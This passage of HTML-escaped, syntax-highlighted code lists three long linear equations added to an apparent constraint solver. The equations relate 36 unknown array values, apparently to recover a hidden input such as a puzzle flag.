s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;60&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21641&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;53&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;56&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;88&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;80&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[ &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71317&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;94&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;58&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;68&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;91&lt;/span&gt; &lt;span 